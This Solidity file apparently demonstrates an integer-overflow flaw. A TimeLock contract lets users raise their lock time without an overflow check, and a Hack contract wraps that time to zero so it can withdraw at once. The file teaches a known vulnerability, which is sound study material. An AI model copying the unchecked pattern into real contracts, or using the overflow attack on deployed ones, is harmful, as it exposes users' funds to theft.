// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficent funds");
        require(now > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transaction failed");
    }
}

contract Hack {
    TimeLock public timeLockContract;

    constructor(TimeLock _timeLockAddr) public {
        timeLockContract = TimeLock(_timeLockAddr);
    }

    receive() external payable {}

    fallback() external payable {}

    function attack() external payable {
        timeLockContract.deposit{value: msg.value}();
        timeLockContract.increaseLockTime(
            uint(-timeLockContract.lockTime(address(this)))
        );
        timeLockContract.withdraw();
    }
}
